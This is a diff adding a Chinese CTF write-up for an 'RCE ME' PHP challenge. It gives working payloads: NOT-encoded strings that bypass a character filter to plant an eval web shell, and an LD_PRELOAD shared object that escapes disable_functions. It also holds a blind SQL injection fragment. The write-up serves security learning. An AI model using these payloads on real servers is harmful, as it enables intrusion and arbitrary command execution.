@@ -91,3 +91,116 @@ data = {"id": f"0^(ascii(substr((select(group_concat(password))from(F1naI1y)wher
 ```
 
 得到回显 `flag{301e4296-b8db-462e-a4e0-6253e9b8dafe}` 。
+
+### RCE ME
+
+题目如下。
+
+```php
+<?php
+error_reporting(0);
+if(isset($_GET['code'])){
+    $code=$_GET['code'];
+    if(strlen($code)>40){
+        die("This is too Long.");
+    }
+    if(preg_match("/[A-Za-z0-9]+/",$code)){
+        die("NO.");
+    }
+    @eval($code);
+}else{
+    highlight_file(__FILE__);
+}
+// ?>
+```
+
+限制条件如下：
+
+1. Payload 长度不超过 40 ；
+2. Payload 不包含数字和字母。
+
+因此尝试用取反 URLEncode 编码绕过，通过以下方式构造 Payload 。
+
+```php
+echo urlencode(~"assert");
+// %9E%8C%8C%9A%8D%8B
+echo urlencode(~'eval($_POST[1]);');
+// %9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4
+// Payload: code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);
+```
+
+即可通过蚁剑发现文件 `readflag` ，但是它是一个文件并且通过蚁剑的 shell 无法执行，猜测需要绕过 disable functions ，先构造 Payload 如下来找出 disable functions 的值。
+
+```php
+echo urlencode(~"phpinfo");
+// %8F%97%8F%96%91%99%90
+// Payload: code=(~%8F%97%8F%96%91%99%90)();
+```
+
+可以得到被禁用的方法如下：
+
+* pcntl\_alarm
+* pcntl\_fork
+* pcntl\_waitpid
+* pcntl\_wait
+* pcntl\_wifexited
+* pcntl\_wifstopped
+* pcntl\_wifsignaled
+* pcntl\_wifcontinued
+* pcntl\_wexitstatus
+* pcntl\_wtermsig
+* pcntl\_wstopsig
+* pcntl\_signal
+* pcntl\_signal\_get\_handler
+* pcntl\_signal\_dispatch
+* pcntl\_get\_last\_error
+* pcntl\_strerror
+* pcntl\_sigprocmask
+* pcntl\_sigwaitinfo
+* pcntl\_sigtimedwait
+* pcntl\_exec
+* pcntl\_getpriority
+* pcntl\_setpriority
+* pcntl\_async\_signals
+* system
+* exec
+* shell\_exec
+* popen
+* proc\_open
+* passthru
+* symlink
+* link
+* syslog
+* imap\_open
+* ld
+* dl
+
+可以利用环境变量 LD\_PRELOAD 劫持系统函数，让外部程序加载恶意 \*.so ，达到执行系统命令的效果，先编写恶意类如下。
+
+```c
+// ld.c
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+__attribute__ ((__constructor__)) void angel (void){
+    unsetenv("LD_PRELOAD");
+    system("/readflag > /tmp/readflag");
+}
+```
+
+通过以下命令进行编译为共享对象。
+
+```shell
+gcc -shared -fPIC ld.c -o ld.so
+```
+
+将该恶意文件上传至 `/tmp` 中，并构造 Payload 如下。
+
+```
+params: code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);
+body: 1=putenv("LD_PRELOAD=/tmp/ld.so");mail("","","","");
+```
+
+之后就能在蚁剑通过查看 `/tmp/readflag` 得到 flag 。
